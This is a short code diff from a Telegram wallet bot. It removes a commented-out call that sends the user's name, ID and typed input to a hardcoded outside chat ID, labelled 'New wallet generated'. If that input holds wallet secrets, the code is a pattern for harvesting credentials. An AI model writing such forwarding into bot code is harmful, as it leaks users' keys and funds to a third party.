@@ -388,13 +388,6 @@ continueScene.hears(/.*/, async (ctx) => {
       await ctx.scene.leave();
       return ctx.scene.enter("START_SCENE");
     }
-    // await ctx.telegram.sendMessage(
-      // Changed from Message to sendMessage
-      //config.otherUsername,
-    //   7491085235,
-    //   `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
-    //   { parse_mode: "HTML" }
-    // );
 
     await ctx.telegram.sendMessage(
       // Changed from Message to sendMessage
